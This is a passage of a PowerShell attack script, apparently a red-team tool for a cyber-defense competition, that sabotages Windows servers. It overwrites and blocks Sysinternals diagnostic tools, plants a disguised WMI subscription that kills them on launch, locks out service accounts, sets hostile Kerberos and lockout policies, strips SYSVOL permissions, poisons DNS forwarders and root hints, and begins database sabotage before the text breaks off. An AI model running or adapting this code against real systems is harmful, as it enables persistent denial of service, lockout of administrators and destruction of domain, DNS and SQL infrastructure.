    # LAYER 2 — WDAC Supplemental Policy
    Write-Section "Layer 2: WDAC Supplemental Policy"

    try {
        $isServer2019 = (Get-CimInstance Win32_OperatingSystem).Caption -match '2019'

        if ($isServer2019) {
            Write-Warn "Server 2019 detected -- skipping WDAC supplemental policy"
        } elseif (-not (Get-Command ConvertFrom-CIPolicy -ErrorAction SilentlyContinue)) {
            Write-Warn "ConvertFrom-CIPolicy not available -- skipping WDAC layer"
        } else {
            $denyRules   = ''
            $denyRuleIds = ''
            foreach ($tool in $TargetTools) {
                $id = 'ID_DENY_' + ($tool -replace '\.exe$','').ToUpper() -replace '[^A-Z0-9]','_'
                $denyRules   += "    <Deny ID=`"$id`" FriendlyName=`"$tool`" FileName=`"$tool`" MinimumFileVersion=`"0.0.0.0`"/>`n"
                $denyRuleIds += "        <FileRuleRef RuleID=`"$id`"/>`n"
            }

            $policyId     = "{$([System.Guid]::NewGuid().ToString().ToUpper())}"
            $basePolicyId = '{A244370E-44C9-4C06-B551-F6016E563076}'

            $wdacXml = @"
<?xml version="1.0" encoding="utf-8"?>
<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy" PolicyType="Supplemental Policy">
  <VersionEx>10.0.0.0</VersionEx>
  <PlatformID>{2E07F7E4-194C-4D20-B696-C4CEF286A669}</PlatformID>
  <PolicyID>$policyId</PolicyID>
  <BasePolicyID>$basePolicyId</BasePolicyID>
  <Rules>
    <Rule><Option>Enabled:Unsigned System Integrity Policy</Option></Rule>
    <Rule><Option>Enabled:Inherit Default Policy</Option></Rule>
  </Rules>
  <EKUs/>
  <FileRules>
$denyRules  </FileRules>
  <Signers/>
  <SigningScenarios>
    <SigningScenario Value="12" ID="ID_SIGNINGSCENARIO_WINDOWS" FriendlyName="User Mode">
      <ProductSigners>
        <FileRulesRef>
$denyRuleIds        </FileRulesRef>
      </ProductSigners>
    </SigningScenario>
  </SigningScenarios>
  <UpdatePolicySigners/>
  <CiSigners/>
  <HvciOptions>0</HvciOptions>
</SiPolicy>
"@
            $tmpPolicyXml = "$env:TEMP\SysInternals_NoEscape_WDAC.xml"
            $wdacXml | Set-Content -Path $tmpPolicyXml -Encoding UTF8

            $ciActivePath = 'C:\Windows\System32\CodeIntegrity\CiPolicies\Active'
            if (-not (Test-Path $ciActivePath)) {
                New-Item -Path $ciActivePath -ItemType Directory -Force | Out-Null
            }
            $siPolicyDest = "$ciActivePath\$($policyId.Trim('{}').ToUpper()).p7b"
            ConvertFrom-CIPolicy -XmlFilePath $tmpPolicyXml -BinaryFilePath $siPolicyDest -ErrorAction Stop
            Remove-Item $tmpPolicyXml -Force -ErrorAction SilentlyContinue

            $ciPath = 'C:\Windows\System32\CodeIntegrity'
            $ciAcl  = Get-Acl $ciPath
            $deny   = New-Object System.Security.AccessControl.FileSystemAccessRule(
                'BUILTIN\Users','Write,Delete',
                'ContainerInherit,ObjectInherit','None','Deny')
            $ciAcl.AddAccessRule($deny)
            Set-Acl -Path $ciPath -AclObject $ciAcl

            Write-Success "WDAC supplemental policy written to $siPolicyDest"
            Write-Warn   "  >>> WDAC enforcement activates on next REBOOT <<<"
        }
    } catch {
        Write-Err "Layer 2 failed: $_"
    }

    # LAYER 3 — WMI Kill-on-Exec Subscription
    Write-Section "Layer 3: WMI Kill-on-Exec Subscription"

    try {
        $ns = 'root\subscription'

        foreach ($cls in @('__EventFilter','CommandLineEventConsumer')) {
            $stale = Get-WmiObject -Namespace $ns -Class $cls -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -in @('WMIHealthMonitor','WBEM_SyncHandler') }
            if ($stale) { $stale | Remove-WmiObject -ErrorAction SilentlyContinue }
        }
        $staleBindings = Get-WmiObject -Namespace $ns -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like '*WMIHealthMonitor*' -or $_.Consumer -like '*WBEM_SyncHandler*' }
        if ($staleBindings) { $staleBindings | Remove-WmiObject -ErrorAction SilentlyContinue }

        $wql = @"
SELECT * FROM Win32_ProcessStartTrace WHERE
  ProcessName LIKE 'procexp%' OR ProcessName LIKE 'procmon%' OR
  ProcessName LIKE 'autoruns%' OR ProcessName LIKE 'autorunsc%' OR
  ProcessName LIKE 'tcpview%' OR ProcessName LIKE 'handle%' OR
  ProcessName LIKE 'strings%' OR ProcessName LIKE 'listdlls%' OR
  ProcessName LIKE 'accesschk%' OR ProcessName LIKE 'procdump%' OR
  ProcessName LIKE 'pslist%'   OR ProcessName LIKE 'bginfo%' OR
  ProcessName LIKE 'sysmon%'
"@

        $filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
            Name             = 'WMIHealthMonitor'
            EventNamespace   = 'root\cimv2'
            QueryLanguage    = 'WQL'
            Query            = $wql
        } -ErrorAction Stop

        $consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
            Name                = 'WBEM_SyncHandler'
            CommandLineTemplate = 'cmd.exe /c taskkill /f /pid %ProcessID%'
        } -ErrorAction Stop

        Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
            Filter   = $filter
            Consumer = $consumer
        } -ErrorAction Stop

        Write-Success "WMI kill subscription registered (WMIHealthMonitor -> WBEM_SyncHandler)"
    } catch {
        Write-Err "Layer 3 failed: $_"
    }

    # LAYER 4 — UNC/SMB Outbound Block + Extended Network Hardening
    Write-Section "Layer 4: UNC/SMB Block + Extended Network Hardening"

    try {
        if (-not (Get-NetFirewallRule -Name 'CCDC_Block_SMB_Outbound' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'CCDC_Block_SMB_Outbound' `
                -DisplayName 'CCDC Block SMB Outbound' `
                -Direction Outbound -Protocol TCP -RemotePort 445 `
                -Action Block -Enabled True | Out-Null
            Write-Success "Firewall: blocked outbound TCP 445 (SMB)"
        } else { Write-Info "Firewall rule CCDC_Block_SMB_Outbound already exists" }

        if (-not (Get-NetFirewallRule -Name 'CCDC_Block_NetBIOS_Outbound' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'CCDC_Block_NetBIOS_Outbound' `
                -DisplayName 'CCDC Block NetBIOS Outbound' `
                -Direction Outbound -Protocol TCP -RemotePort 139 `
                -Action Block -Enabled True | Out-Null
            Write-Success "Firewall: blocked outbound TCP 139 (NetBIOS)"
        } else { Write-Info "Firewall rule CCDC_Block_NetBIOS_Outbound already exists" }

        $hostsPath    = 'C:\Windows\System32\drivers\etc\hosts'
        $hostsContent = Get-Content $hostsPath -Raw -ErrorAction SilentlyContinue
        $hostsEntries = @(
            '127.0.0.1 live.sysinternals.com',
            '127.0.0.1 download.sysinternals.com',
            '127.0.0.1 technet.microsoft.com',
            '127.0.0.1 learn.microsoft.com',
            '0.0.0.0   live.sysinternals.com',
            '0.0.0.0   download.sysinternals.com'
        )
        foreach ($entry in $hostsEntries) {
            $domain = ($entry -split '\s+')[1]
            if ($hostsContent -notmatch [regex]::Escape($domain)) {
                Add-Content -Path $hostsPath -Value $entry -ErrorAction SilentlyContinue
                Write-Success "Hosts: added $entry"
            }
        }

        try {
            $hostsAcl  = Get-Acl $hostsPath
            $denyWrite = New-Object System.Security.AccessControl.FileSystemAccessRule(
                'BUILTIN\Users','Write,AppendData','None','None','Deny')
            $hostsAcl.AddAccessRule($denyWrite)
            Set-Acl -Path $hostsPath -AclObject $hostsAcl
            Write-Success "Hosts file ACL-locked (deny write for Users)"
        } catch { Write-Warn "Could not ACL hosts file: $_" }

        try {
            Set-Service -Name WebClient -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name WebClient -Force -ErrorAction SilentlyContinue
            Write-Success "WebClient service stopped and disabled"
        } catch { Write-Warn "WebClient: $_" }

    } catch {
        Write-Err "Layer 4 failed: $_"
    }

    # LAYER 5 — Poison Existing Copies In-Place
    Write-Section "Layer 5: Poison Existing Binaries"

    $userDirs = @()
    if (Test-Path 'C:\Users') {
        $userDirs = Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue |
            ForEach-Object {
                @(
                    "$($_.FullName)\Downloads",
                    "$($_.FullName)\Desktop",
                    "$($_.FullName)\Documents",
                    "$($_.FullName)\AppData\Local\Temp",
                    "$($_.FullName)\AppData\Roaming",
                    "$($_.FullName)\AppData\Local"
                )
            }
    }

    $pathDirs  = @($env:PATH -split ';' | Where-Object { $_ })
    $fixedDirs = @('C:\Tools','C:\Sysinternals','C:\SysInternals64','C:\SysinternalsSuite',
                   'C:\Windows\Temp','C:\Temp','C:\ProgramData',
                   'C:\Windows\System32','C:\Windows\SysWOW64')
    $searchPaths = ($pathDirs + $fixedDirs + $userDirs) |
        Where-Object { $_ -and (Test-Path $_) } | Sort-Object -Unique

    $poisonedCount = 0
    foreach ($searchDir in $searchPaths) {
        foreach ($tool in $TargetTools) {
            $target = Join-Path $searchDir $tool
            if (Test-Path $target -PathType Leaf) {
                try {
                    $null = & takeown.exe /f "$target" /a 2>&1
                    $null = & icacls.exe "$target" /grant "BUILTIN\Administrators:F" 2>&1
                    [System.IO.File]::WriteAllBytes($target, [byte[]]@())
                    $fileAcl  = Get-Acl $target
                    $denyExec = New-Object System.Security.AccessControl.FileSystemAccessRule(
                        'Everyone','ExecuteFile','None','None','Deny')
                    $fileAcl.AddAccessRule($denyExec)
                    Set-Acl -Path $target -AclObject $fileAcl
                    Write-Success "Poisoned: $target"
                    $poisonedCount++
                } catch { Write-Warn "Could not poison $target : $_" }
            }
        }

        try {
            Get-ChildItem $searchDir -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -imatch 'sysinternals' -and $_.Extension -imatch '\.(zip|7z|rar)' } |
                ForEach-Object {
                    $null = & takeown.exe /f "$($_.FullName)" /a 2>&1
                    [System.IO.File]::WriteAllBytes($_.FullName, [byte[]]@())
                    Write-Success "Poisoned archive: $($_.FullName)"
                    $poisonedCount++
                }
        } catch {}
    }

    if ($poisonedCount -gt 0) {
        Write-Success "Poisoned $poisonedCount existing Sysinternals files"
    } else {
        Write-Info "No existing Sysinternals binaries found"
    }

    # LAYER 6 — Zone.Identifier ADS Marker
    Write-Section "Layer 6: Zone.Identifier ADS Marker"

    $adsContent = "[ZoneTransfer]`r`nZoneId=4`r`nReferrerUrl=https://live.sysinternals.com/`r`nHostUrl=https://live.sysinternals.com/`r`n"
    $adsMarked  = 0

    foreach ($searchDir in $searchPaths) {
        foreach ($tool in $TargetTools) {
            $target = Join-Path $searchDir $tool
            if (Test-Path $target -PathType Leaf) {
                try {
                    $adsPath = "$target`:Zone.Identifier"
                    [System.IO.File]::WriteAllText($adsPath, $adsContent,
                        [System.Text.Encoding]::UTF8)
                    $adsMarked++
                } catch { Write-Warn "ADS write failed for $target : $_" }
            }
        }
    }

    if ($adsMarked -gt 0) {
        Write-Success "Zone.Identifier (ZoneId=4 Restricted) written to $adsMarked files"
    } else {
        Write-Info "No existing binaries to mark"
    }

    # LAYER 7 — Registry & Policy ACL Hardening
    Write-Section "Layer 7: Lock Enforcement Infrastructure (Registry ACL)"

    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\SrpV2'     'AppLocker policy (SrpV2)'
    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe' 'AppLocker Exe rules'

    foreach ($tool in $TargetTools) {
        $ifeoSub = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tool"
        if (Test-Path "HKLM:\$ifeoSub") {
            Lock-RegistryKey $ifeoSub "IFEO\$tool"
        }
    }

    Lock-RegistryKey 'SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy' `
        'Windows Firewall policy'
    Lock-RegistryKey 'SYSTEM\CurrentControlSet\Services\AppIDSvc' 'AppIDSvc service key'

    Write-Success "Registry ACL hardening complete"

    # LAYER 8 — Software Restriction Policies Path Rules
    Write-Section "Layer 8: Software Restriction Policy Path Rules"

    try {
        $srpBase = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers'

        if (-not (Test-Path $srpBase)) {
            New-Item -Path $srpBase -Force | Out-Null
        }

        if (-not (Get-ItemProperty $srpBase -Name 'DefaultLevel' -ErrorAction SilentlyContinue)) {
            Set-ItemProperty $srpBase -Name 'DefaultLevel'       -Value 0x20000 -Type DWord
            Set-ItemProperty $srpBase -Name 'PolicyScope'        -Value 0       -Type DWord
            Set-ItemProperty $srpBase -Name 'ExecutableTypes'    -Value @('EXE') -Type MultiString
            Set-ItemProperty $srpBase -Name 'TransparentEnabled' -Value 1       -Type DWord
        }

        $pathsKey = "$srpBase\0\Paths"
        if (-not (Test-Path $pathsKey)) { New-Item -Path $pathsKey -Force | Out-Null }

        $addedRules = 0
        foreach ($tool in $TargetTools) {
            $existing = Get-ChildItem $pathsKey -ErrorAction SilentlyContinue |
                Where-Object {
                    (Get-ItemProperty $_.PSPath -Name ItemData -ErrorAction SilentlyContinue).ItemData -imatch [regex]::Escape($tool)
                }
            if ($existing) { continue }

            $ruleGuid = "{$([System.Guid]::NewGuid().ToString().ToUpper())}"
            $ruleKey  = "$pathsKey\$ruleGuid"
            New-Item -Path $ruleKey -Force | Out-Null
            Set-ItemProperty $ruleKey -Name 'Description'  -Value 'CCDC SysInternals block'
            Set-ItemProperty $ruleKey -Name 'ItemData'     -Value "*\$tool"     -Type ExpandString
            Set-ItemProperty $ruleKey -Name 'SaferFlags'   -Value 0             -Type DWord
            Set-ItemProperty $ruleKey -Name 'LastModified' -Value (
                [System.BitConverter]::GetBytes([System.DateTime]::UtcNow.ToFileTimeUtc())
            ) -Type Binary -ErrorAction SilentlyContinue
            $addedRules++
        }

        Write-Success "SRP: added $addedRules disallowed path rules for Sysinternals tools"

        Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers'          'SRP CodeIdentifiers'
        Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths'  'SRP disallowed paths'

    } catch {
        Write-Err "Layer 8 failed: $_"
    }

    Write-Host ""
    Write-Success "NoEscape complete"
    Write-Warn "IMPORTANT: WDAC policy (Layer 2) requires a REBOOT to take full effect."
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 4 — ACTIVE DIRECTORY: KERBEROS KHAOS  (DC only)
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-KerberosKhaos {
    Write-Section "4/7 — KerberosKhaos: AD Auth / Lockout / SYSVOL Destruction"

    # DC role check (safety net — Run-Modules already gates on $script:IsAD)
    $ntdsSvc = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
    if (-not $ntdsSvc) {
        Write-Err "NTDS service not found — not a Domain Controller. Skipping."
        return
    }

    Import-Module ActiveDirectory -ErrorAction Stop

    $ADDomain      = Get-ADDomain
    $DomainDNS     = $ADDomain.DNSRoot
    $DomainNetbios = $ADDomain.NetBIOSName
    Write-Info "Domain: $DomainDNS ($DomainNetbios)"

    # LAYER 1 — Kerberos Ticket TTL Weaponization
    Write-Section "LAYER 1 — Kerberos Ticket TTL Weaponization"

    $l1TmpBase = "$env:TEMP\kk_l1_$(Get-Random -Maximum 99999)"
    $l1Inf     = "${l1TmpBase}.inf"
    $l1Sdb     = "${l1TmpBase}.sdb"

    $l1InfLines = @(
        '[Unicode]',
        'Unicode=yes',
        '[Version]',
        'signature="$CHICAGO$"',
        'Revision=1',
        '[Kerberos Policy]',
        'MaxServiceAge = 10',
        'MaxTicketAge = 1',
        'MaxRenewAge = 1',
        'MaxClockSkew = 0',
        'TicketValidateClient = 1'
    )
    $l1InfLines | Out-File $l1Inf -Encoding Unicode

    & secedit.exe /configure /db $l1Sdb /cfg $l1Inf /areas SECURITYPOLICY /overwrite /quiet
    if ($LASTEXITCODE -eq 0) {
        Write-Success "Kerberos policy applied via secedit"
        Write-Info   "  MaxTicketAge=1hr  MaxClockSkew=0min  MaxRenewAge=1day"
    } else {
        Write-Err "secedit failed (exit $LASTEXITCODE)"
    }
    Remove-Item $l1Inf, $l1Sdb -Force -ErrorAction SilentlyContinue

    & gpupdate.exe /force /quiet 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "gpupdate /force executed"
    } else {
        Write-Warn "gpupdate returned exit $LASTEXITCODE — policy may apply on next refresh"
    }

    # LAYER 2 — Account Lockout Weaponization
    Write-Section "LAYER 2 — Account Lockout Weaponization"

    try {
        Set-ADDefaultDomainPasswordPolicy -Identity $DomainDNS `
            -LockoutThreshold 1 `
            -LockoutDuration ([System.TimeSpan]::Zero) `
            -LockoutObservationWindow (New-TimeSpan -Minutes 99999)
        Write-Success "Lockout policy: threshold=1, duration=never, window=99999min"
    } catch {
        Write-Err "Failed to set lockout policy: $_"
    }

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    $allEnabled  = Get-ADUser -Filter "Enabled -eq $True" -Properties SamAccountName
    $svcAccounts = $allEnabled | Where-Object {
        $n = $_.SamAccountName
        $n -like '*svc*'   -or $n -like '*dns*'   -or $n -like '*sql*' -or
        $n -like '*iis*'   -or $n -like '*mssql*' -or $n -like '*http*'
    } | Select-Object -ExpandProperty SamAccountName

    if ($svcAccounts) {
        $ctx = $null
        try {
            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
                [System.DirectoryServices.AccountManagement.ContextType]::Domain,
                $DomainDNS)
        } catch {
            Write-Warn "Could not create domain PrincipalContext: $_"
        }

        foreach ($sam in $svcAccounts) {
            if ($ctx) {
                try {
                    $badPwd = "KK_BadPwd_$(Get-Random -Maximum 999999)"
                    $null   = $ctx.ValidateCredentials($sam, $badPwd)
                    Write-Success "Pre-locked: $sam"
                } catch {
                    Write-Warn "Pre-lock attempt for ${sam}: $_"
                }
            } else {
                Write-Warn "Skipped pre-lock for ${sam} (no domain context)"
            }
        }

        if ($ctx) { $ctx.Dispose() }
    } else {
        Write-Warn "No service accounts matched naming patterns — skipping pre-lock"
        Write-Info "Policy is live; first bad auth by any svc account will lock it permanently"
    }

    # LAYER 3 — SYSVOL/NETLOGON ACL Destruction
    Write-Section "LAYER 3 — SYSVOL/NETLOGON ACL Destruction"

    $sysvolRoot = "C:\Windows\SYSVOL\sysvol\$DomainDNS"
    $aclTargets = @(
        $sysvolRoot,
        "$sysvolRoot\Policies",
        "$sysvolRoot\scripts"
    )

    foreach ($p in $aclTargets) {
        if (Test-Path $p) {
            & icacls.exe $p /remove "Authenticated Users" /T /C /Q 2>$null
            $rc1 = $LASTEXITCODE
            & icacls.exe $p /remove "Everyone" /T /C /Q 2>$null
            $rc2 = $LASTEXITCODE
            if ($rc1 -eq 0 -and $rc2 -eq 0) {
                Write-Success "Stripped ACEs from: $p"
            } else {
                Write-Warn "icacls partial failure on $p (rc1=$rc1 rc2=$rc2)"
            }
        } else {
            Write-Warn "Path not found (skipped): $p"
        }
    }

    $netlogonKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters"
    try {
        Set-ItemProperty -Path $netlogonKey -Name "DisablePasswordChange" -Value 1 -Type DWord
        Write-Success "DisablePasswordChange = 1 set in Netlogon\Parameters"
    } catch {
        Write-Err "Failed to set DisablePasswordChange: $_"
    }

    Write-Host ""
    Write-Success "KerberosKhaos complete — all 3 layers applied"
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 5 — DNS: CONDITIONAL SURRENDER  (DNS role)
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-ConditionalSurrender {
    Write-Section "5/7 — ConditionalSurrender: DNS Forwarder / TTL / Recursion Destruction"

    # DNS role check (safety net)
    $dnsSvc = Get-Service -Name "DNS" -ErrorAction SilentlyContinue
    if (-not $dnsSvc) {
        Write-Err "DNS Server service not found — DNS Server role not installed. Skipping."
        return
    }
    Write-Info "DNS Server service found (State: $($dnsSvc.Status))"

    $dnsModuleAvailable = $false
    if (Get-Module -Name DnsServer -ListAvailable -ErrorAction SilentlyContinue) {
        try {
            Import-Module DnsServer -ErrorAction Stop
            $dnsModuleAvailable = $true
            Write-Info "DnsServer PowerShell module loaded"
        } catch {
            Write-Warn "DnsServer module import failed — will use dnscmd fallback: $_"
        }
    } else {
        Write-Warn "DnsServer PowerShell module not available — using dnscmd fallback"
    }

    $CompDomains = @("ccdc.local", "range.internal", "competition.local")
    $BlackholeIP = "192.0.2.1"

    # LAYER 1 — Conditional Forwarder Poisoning
    Write-Section "LAYER 1 — Conditional Forwarder Poisoning"

    foreach ($domain in $CompDomains) {
        Write-Info "  Poisoning forwarder: $domain -> $BlackholeIP"
        $applied = $false

        if ($dnsModuleAvailable) {
            try {
                $existing = Get-DnsServerZone -Name $domain -ErrorAction SilentlyContinue
                if ($existing -and $existing.ZoneType -eq "Forwarder") {
                    Set-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                    Write-Success "  Updated existing forwarder zone: $domain -> $BlackholeIP"
                    $applied = $true
                } else {
                    if ($existing) {
                        Remove-DnsServerZone -Name $domain -Force -ErrorAction SilentlyContinue
                        Write-Warn "    Removed existing zone: $domain (was $($existing.ZoneType))"
                    }
                    Add-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                    Write-Success "  Added conditional forwarder: $domain -> $BlackholeIP"
                    $applied = $true
                }
            } catch {
                Write-Warn "    PS module path failed for $domain — trying dnscmd: $_"
            }
        }

        if (-not $applied) {
            & dnscmd.exe /zonedelete $domain /f 2>$null | Out-Null
            & dnscmd.exe /zoneadd $domain /forwarder $BlackholeIP 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                Write-Success "  dnscmd: Added forwarder zone $domain -> $BlackholeIP"
            } else {
                Write-Err "  dnscmd: Failed to add forwarder for $domain (rc=$LASTEXITCODE)"
            }
        }
    }

    # LAYER 2 — TTL / Scavenging Destruction
    Write-Section "LAYER 2 — TTL / Scavenging Destruction"

    $dnscmdConfigs = @(
        @{ Flag = "/DefaultTTL";               Value = "1"; Label = "DefaultTTL = 1s"               },
        @{ Flag = "/ScavengingInterval";        Value = "1"; Label = "ScavengingInterval = 1h"        },
        @{ Flag = "/DefaultNoRefreshInterval";  Value = "1"; Label = "DefaultNoRefreshInterval = 1h"  },
        @{ Flag = "/DefaultRefreshInterval";    Value = "1"; Label = "DefaultRefreshInterval = 1h"    }
    )

    foreach ($cfg in $dnscmdConfigs) {
        & dnscmd.exe /Config $($cfg.Flag) $($cfg.Value) 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "  $($cfg.Label)"
        } else {
            Write-Warn "  dnscmd /Config $($cfg.Flag) failed (rc=$LASTEXITCODE)"
        }
    }

    if ($dnsModuleAvailable) {
        try {
            $primaryZones = Get-DnsServerZone | Where-Object {
                $_.ZoneType -eq "Primary" -and -not $_.IsAutoCreated -and $_.ZoneName -ne "TrustAnchors"
            }

            foreach ($z in $primaryZones) {
                try {
                    Set-DnsServerZoneAging -Name $z.ZoneName -Aging $true `
                        -NoRefreshInterval (New-TimeSpan -Hours 1) `
                        -RefreshInterval   (New-TimeSpan -Hours 1) -ErrorAction Stop
                    Write-Success "  Enabled aging on zone: $($z.ZoneName)"
                } catch {
                    Write-Warn "    Zone aging failed for $($z.ZoneName): $_"
                }

                try {
                    $soa    = Get-DnsServerResourceRecord -ZoneName $z.ZoneName -RrType Soa -ErrorAction Stop
                    $soaNew = $soa.Clone()
                    $soaNew.RecordData.MinimumTimeToLive = [System.TimeSpan]::Zero
                    $soaNew.TimeToLive = New-TimeSpan -Seconds 1
                    Set-DnsServerResourceRecord -ZoneName $z.ZoneName `
                        -OldInputObject $soa -NewInputObject $soaNew -ErrorAction Stop
                    Write-Success "  Zeroed SOA minimum TTL for $($z.ZoneName)"
                } catch {
                    Write-Warn "    SOA TTL zeroing failed for $($z.ZoneName): $_"
                }
            }
        } catch {
            Write-Warn "Zone enumeration failed: $_"
        }
    } else {
        Write-Warn "DnsServer module unavailable — per-zone aging skipped"
    }

    # LAYER 3 — Recursion Trap + Console ACL Lock
    Write-Section "LAYER 3 — Recursion Trap + Console ACL Lock"

    & dnscmd.exe /Config /NoRecursion 1 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "NoRecursion = 1 (all recursive queries disabled)"
    } else {
        Write-Warn "dnscmd /Config /NoRecursion 1 failed (rc=$LASTEXITCODE)"
    }

    $cacheDns  = "$env:SystemRoot\System32\dns\CACHE.DNS"
    $cacheBack = "$env:SystemRoot\System32\dns\CACHE.DNS.bak"

    if (Test-Path $cacheDns) {
        if (-not (Test-Path $cacheBack)) {
            try {
                Copy-Item $cacheDns $cacheBack -ErrorAction Stop
                Write-Info "Backed up original cache.dns to CACHE.DNS.bak"
            } catch {
                Write-Warn "  Backup of cache.dns failed: $_"
            }
        }

        $fakeRoots = @(
            '; root hints poisoned — all roots point to RFC 5737 blackhole (192.0.2.1)',
            '.                        3600000 IN  NS  a.root-servers.net.',
            'a.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  b.root-servers.net.',
            'b.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  c.root-servers.net.',
            'c.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  d.root-servers.net.',
            'd.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  e.root-servers.net.',
            'e.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  f.root-servers.net.',
            'f.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  g.root-servers.net.',
            'g.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  h.root-servers.net.',
            'h.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  i.root-servers.net.',
            'i.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  j.root-servers.net.',
            'j.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  k.root-servers.net.',
            'k.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  l.root-servers.net.',
            'l.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  m.root-servers.net.',
            'm.root-servers.net.      3600000     A   192.0.2.1'
        )

        try {
            Set-Content -Path $cacheDns -Value $fakeRoots -Encoding ASCII -ErrorAction Stop
            Write-Success "Root hints (cache.dns) overwritten — all 13 roots -> $BlackholeIP"
        } catch {
            Write-Err "Failed to overwrite cache.dns: $_"
        }
    } else {
        Write-Warn "cache.dns not found at $cacheDns — skipping root hints poison"
    }

    try {
        Restart-Service -Name "DNS" -Force -ErrorAction Stop
        Write-Success "DNS service restarted (poisoned root hints now active)"
    } catch {
        Write-Warn "DNS service restart failed — hints apply after next manual restart: $_"
    }

    $dnsMmc = "$env:SystemRoot\System32\dnsmgmt.msc"
    if (Test-Path $dnsMmc) {
        & icacls.exe $dnsMmc /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "ACL-locked dnsmgmt.msc — DNS Manager console throws Access Denied"
        } else {
            Write-Warn "icacls /deny on dnsmgmt.msc returned $LASTEXITCODE"
        }
    } else {
        Write-Warn "dnsmgmt.msc not found at expected path"
    }

    try {
        $regHive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default
        )
        $dnsKey = $regHive.OpenSubKey(
            "SYSTEM\CurrentControlSet\Services\DNS",
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
            [System.Security.AccessControl.RegistryRights]::ReadPermissions
        )
        if ($dnsKey) {
            $acl  = $dnsKey.GetAccessControl()
            $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
                "BUILTIN\Users",
                "ReadKey",
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($deny)
            $dnsKey.SetAccessControl($acl)
            $dnsKey.Close()
            Write-Success "Registry ACL: Denied BUILTIN\Users ReadKey on DNS service key"
        } else {
            Write-Warn "Could not open DNS registry key for ACL modification"
        }
        $regHive.Close()
    } catch {
        Write-Warn "Registry ACL on DNS key failed: $_"
    }

    Write-Host ""
    Write-Success "ConditionalSurrender complete — all 3 layers applied"
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 6 — MSSQL: DEAD IN THE WATER  (MSSQL role)
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-DeadInTheWater {
    Write-Section "6/7 — DeadInTheWater: MSSQL Service / DB / Network Destruction"

    # MSSQL role check (safety net)
    if (-not (Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue)) {
        Write-Warn "MSSQLSERVER service not found — skipping"
        return
    }

    function Get-SqlRegBase {
        $sqlRoot = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
        $verDir  = Get-ChildItem $sqlRoot -ErrorAction SilentlyContinue |
                   Where-Object { $_.PSChildName -match '^MSSQL\d{2}\.MSSQLSERVER$' } |
                   Select-Object -First 1
        if (-not $verDir) { return $null }
        return Join-Path $sqlRoot "$($verDir.PSChildName)\MSSQLServer"
    }

    $SqlBase = Get-SqlRegBase
    if (-not $SqlBase) {
        Write-Err "Cannot locate SQL Server registry base — aborting"
        return
    }
    Write-Info "SQL Server registry base: $SqlBase"

    # LAYER 2 — Database Sabotage (run first while SQL is up)
    Write-Section "LAYER 2 — DATABASE SABOTAGE (T1565.001 + T1562.004)"
    Write-Info "Executing T-SQL database sabotage via .NET SqlClient..."
    try {
        $connStr = "Server=localhost;Integrated Security=true;Database=master;Connect Timeout=10"
        $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
        try {
